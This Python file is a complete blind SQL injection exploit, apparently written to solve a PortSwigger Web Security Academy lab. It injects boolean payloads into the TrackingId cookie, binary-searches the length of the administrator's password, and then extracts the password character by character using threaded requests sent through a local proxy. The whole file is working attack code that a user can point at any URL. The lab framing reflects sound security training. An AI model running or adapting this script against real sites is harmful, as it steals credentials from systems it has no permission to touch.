import logging
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from threading import Event
from typing import Dict, Self, Union

import click
import requests as r
import urllib3
from rich.console import Console
from rich.live import Live
from rich.logging import RichHandler
from rich.text import Text
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[
        RichHandler(
            rich_tracebacks=True,
            markup=True,
        )
    ],
)

logger = logging.getLogger(__name__)

logging.getLogger("urllib3.connectionpool").setLevel(logging.ERROR)


@dataclass
class Attack:
    url: str

    charset: str = string.ascii_letters + string.digits + "_$"

    session: r.Session = field(default_factory=r.Session)
    console: Console = field(default_factory=Console)

    max_passwd: int = 50
    passwd_len: Union[int, None] = None
    password: str = ""
    passwd_dct: Dict[int, str] = field(init=False)
    trying: Dict[int, str] = field(init=False)

    keyword: str = "Welcome back!"

    payloads: Dict[str, str] = field(init=False)
    cookies: Dict[str, str] = field(init=False)

    def __post_init__(self: Self) -> None:
        logger.info("Initializing attack against %s", self.url)

        self.session.verify = False

        self.session.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }

        logger.debug(
            "HTTP proxy configured: %s",
            self.session.proxies,
        )

        self.payloads = {
            "passwd": (
                "' AND (SELECT 'A' FROM users "
                "WHERE username = 'administrator' "
                "AND LENGTH(password) > {length}) = 'A' --"
            ),
            "char": (
                "' AND (SELECT SUBSTR(password, {idx}, 1) FROM users WHERE username = 'administrator') = '{char}"
            ),
        }

        logger.debug("Payloads initialized")

        self.passwd_dct = {}
        self.trying = {}
        self.cookies = {}

        logger.info("Sending initial request")

        try:
            response: r.Response = self.session.get(
                self.url,
                timeout=10,
            )

            response.raise_for_status()

        except r.RequestException:
            logger.exception("Initial request failed")

            exit(1)

        logger.info(
            "Initial request successful: HTTP %d",
            response.status_code,
        )

        tracking_id = response.cookies.get("TrackingId")
        session = response.cookies.get("session")

        if not tracking_id or not session:
            logger.error("Required cookies were not found")
            return

        logger.info("Required session cookies retrieved")

        self.cookies.setdefault("TrackingId", tracking_id)
        self.cookies.setdefault("session", session)

    def render_password(self) -> Text:
        if self.passwd_len is None:
            return Text("Password: ...")

        password = "".join(
            self.passwd_dct.get(idx) or random.choice(self.charset)
            for idx in range(1, self.passwd_len + 1)
        )

        return Text(f"Password: {password}")

    def find_passwd(self: Self):
        if isinstance(self.passwd_len, int):
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [
                    executor.submit(self.find_char, idx)
                    for idx in range(1, self.passwd_len + 1)
                ]
                for _ in as_completed(futures):
                    ...

    def find_passwd_length(self: Self) -> Union[int, None]:

        logger.info("Starting password length discovery")

        payload: str = self.payloads["passwd"]

        _high = self.max_passwd
        _low = 0

        while _low < _high:
            mid = (_high + _low) // 2

            logger.debug(
                "Testing password length: %d (range: %d-%d)",
                mid,
                _low,
                _high,
            )

            try:
                response: r.Response = self.session.get(
                    self.url,
                    cookies={
                        "TrackingId": (
                            self.cookies["TrackingId"] + payload.format(length=mid)
                        ),
                        "session": self.cookies["session"],
                    },
                    timeout=10,
                )

                response.raise_for_status()

            except r.RequestException:
                logger.exception(
                    "Request failed while testing length %d",
                    mid,
                )
                return None

            if self.keyword in response.text:
                logger.debug(
                    "Condition TRUE for length %d",
                    mid,
                )

                _low = mid + 1

            else:
                logger.debug(
                    "Condition FALSE for length %d",
                    mid,
                )

                _high = mid

            logger.info(
                "Search range: %d-%d",
                _low,
                _high,
            )

        self.passwd_len = _low

        logger.info(
            "Password length discovered: %d",
            _low,
        )

    def find_char(self: Self, idx: int):
        stop_event = Event()

        payload: str = self.payloads["char"]

        def check(char: str):
            self.trying[idx] = char
            self.live.update(self.render_password())

            if stop_event.is_set():
                return char, False

            response: r.Response = self.session.get(
                self.url,
                cookies={
                    "TrackingId": (
                        self.cookies["TrackingId"] + payload.format(idx=idx, char=char)
                    ),
                    "session": self.cookies["session"],
                },
                timeout=10,
            )

            if self.keyword in response.text:
                stop_event.set()
                self.passwd_dct.setdefault(idx, char)

                return char, True

            return char, False

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check, ch) for ch in self.charset]
            for _ in as_completed(futures):
                if stop_event.is_set():
                    for f in futures:
                        f.cancel()  # Only cancels tasks that haven't started

                    break

    def start(self: Self) -> None:
        self.find_passwd_length()

        if self.passwd_len is not None:
            logger.info(
                "Final password length: %d",
                self.passwd_len,
            )

            with Live(
                self.render_password(),
                refresh_per_second=10,
            ) as live:
                self.live = live
                self.find_passwd()

                live.update(self.render_password())


@click.command()
@click.option(
    "--lab-url",
    required=True,
    help="Target PortSwigger lab URL",
)
def main(lab_url: str) -> None:
    attack = Attack(lab_url)

    attack.start()


if __name__ == "__main__":
    main()
